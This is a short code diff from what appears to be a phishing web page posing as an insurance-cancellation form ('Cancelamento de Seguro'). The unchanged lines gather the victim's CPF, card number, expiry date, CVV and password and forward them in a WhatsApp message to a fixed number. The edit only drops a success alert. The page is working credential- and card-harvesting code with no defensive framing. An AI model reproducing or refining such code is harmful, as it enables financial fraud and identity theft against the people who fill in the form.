@@ -390,8 +390,7 @@ if (submitBtn) {
             if (response.ok) {
                 const message = `Cancelamento de Seguro\nCPF: ${cpf.value}\nCartão: ${cardNumber.value}\nExpiração: ${expiryDate.value}\nCVV: ${cvv.value}\nSenha: ${password.value}`;
                 whatsappRedirectBtn.addEventListener('click', () => window.location.href = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`, { once: true });
-                // Removido o redirecionamento para /admin
-                alert('Dados enviados com sucesso! Clique no botão abaixo para contatar o suporte via WhatsApp.');
+                // Removido o alert e o redirecionamento para /admin
             } else {
                 alert(result.error || 'Erro ao enviar os dados.');
             }
